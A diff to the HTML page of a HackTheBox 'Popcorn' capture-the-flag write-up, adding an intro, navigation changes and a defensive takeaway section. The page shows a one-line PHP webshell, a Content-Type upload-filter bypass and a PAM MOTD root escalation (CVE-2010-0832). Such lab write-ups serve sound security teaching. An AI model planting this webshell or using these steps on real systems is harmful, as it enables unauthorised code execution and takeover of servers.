@@ -17,6 +17,9 @@
       
       
       
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../../../feed_rss_updated.xml">
+      
       <link rel="icon" href="../../../../../../assets/favicon-zero.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
     
@@ -72,6 +75,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#takeaway" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -192,13 +200,13 @@
   
   
     <li class="md-tabs__item">
-      <a href="/#write-ups" class="md-tabs__link">
+      <a href="/#blog" class="md-tabs__link">
         
   
   
     
   
-  Write-ups
+  Blog
 
       </a>
     </li>
@@ -218,6 +226,25 @@
     
   
   CVEs
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="/#write-ups" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Write-ups
 
       </a>
     </li>
@@ -310,12 +337,12 @@
   
   
     <li class="md-nav__item">
-      <a href="/#write-ups" class="md-nav__link">
+      <a href="/#blog" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Write-ups
+    Blog
     
   </span>
   
@@ -338,6 +365,28 @@
   
   <span class="md-ellipsis">
     CVEs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="/#write-ups" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write-ups
     
   </span>
   
@@ -387,6 +436,23 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#takeaway" class="md-nav__link">
+    <span class="md-ellipsis">
+      Takeaway
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -406,6 +472,16 @@
 <p><img alt="Popcorn" src="../img/Popcorn-0001.png" /></p>
 <p>Machine: <a href="https://app.hackthebox.com/machines/Popcorn">Popcorn</a>:
 Medium . Linux</p>
+<p>In this medium Linux machine, we exploit a Torrent Hoster web application that validates
+uploads only by their <code>Content-Type</code> header. Bypassing that check lets us upload a PHP webshell
+for remote code execution, and an outdated PAM stack (CVE-2010-0832, PAM MOTD) gives us root.
+You will learn how to:</p>
+<ul>
+<li>Enumerate a web application and discover the Torrent Hoster upload feature</li>
+<li>Bypass a <code>Content-Type</code>-based file-upload filter with Burp Suite</li>
+<li>Gain RCE through an uploaded PHP webshell</li>
+<li>Escalate to root using the PAM MOTD local privilege escalation (CVE-2010-0832)</li>
+</ul>
 <hr />
 <p>Tags: #file-upload-bypass #content-type-bypass #webshell #CVE-2010-0832 #PAM-MOTD #privesc #linux</p>
 <hr />
@@ -519,16 +595,16 @@ Local Privilege Escalation — CVE-2010-0832: PAM MOTD allows any local user to 
 <a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a>PNG<span class="w">                     </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">316</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">20</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">10</span>,<span class="w"> </span>Duration:<span class="w"> </span>314ms<span class="o">]</span>
 <a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a>::<span class="w"> </span>Progress:<span class="w"> </span><span class="o">[</span><span class="m">29999</span>/29999<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Job<span class="w"> </span><span class="o">[</span><span class="m">1</span>/1<span class="o">]</span><span class="w"> </span>::<span class="w"> </span><span class="m">105</span><span class="w"> </span>req/sec<span class="w"> </span>::<span class="w"> </span>Duration:<span class="w"> </span><span class="o">[</span><span class="m">0</span>:03:47<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Errors:<span class="w"> </span><span class="m">1</span><span class="w"> </span>::
 </code></pre></div></p>
-<p>We can see the web interface is a <strong>Torrent Hoster</strong> application, a torrent management application with upload functionality:
+<p>We can see that the web interface is <strong>Torrent Hoster</strong>, a torrent management application with upload functionality:
 <img alt="Popcorn" src="../img/Popcorn-0002.png" /></p>
 <p>We registered with test credentials to obtain authenticated access:
 <img alt="Popcorn" src="../img/Popcorn-0003.png" /></p>
 <p>We can see it's vulnerable to a file upload attack: <a href="https://www.exploit-db.com/exploits/11746">Exploit</a></p>
-<p>We create a webshell:
+<p>We created a webshell:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>❯<span class="w"> </span>cat<span class="w"> </span>shell.php<span class="w"> </span>-p
 <a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"cmd"</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;
 </code></pre></div></p>
-<p>We created a valid torrent file and uploaded a valid torrent to obtain the ID assigned by the application:
+<p>We created a valid torrent file and uploaded it to obtain the ID assigned by the application:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>❯<span class="w"> </span>file<span class="w"> </span>valid.torrent
 <a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>valid.torrent:<span class="w"> </span>BitTorrent<span class="w"> </span>file
 </code></pre></div></p>
@@ -662,6 +738,13 @@ Local Privilege Escalation — CVE-2010-0832: PAM MOTD allows any local user to 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>root@popcorn:/tmp#<span class="w"> </span>cat<span class="w"> </span>/root/root.txt
 <a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>&lt;ROOT_FLAG&gt;
 </code></pre></div></p>
+<hr />
+<h2 id="takeaway">Takeaway</h2>
+<ul>
+<li><strong>Validate uploads by content, not by the <code>Content-Type</code> header.</strong> The client fully controls that header. Real validation checks the file contents and extension server-side, and stores uploads outside the web root.</li>
+<li><strong>Never let uploaded files execute under the web root.</strong> The webshell ran only because it landed in <code>/torrent/upload/</code> as a <code>.php</code>. Uploads should be stored where the server will not execute them.</li>
+<li><strong>Keep the OS and PAM stack patched.</strong> CVE-2010-0832 is ancient; a maintained host would not have been vulnerable to the PAM MOTD escalation.</li>
+</ul>
 
 
 
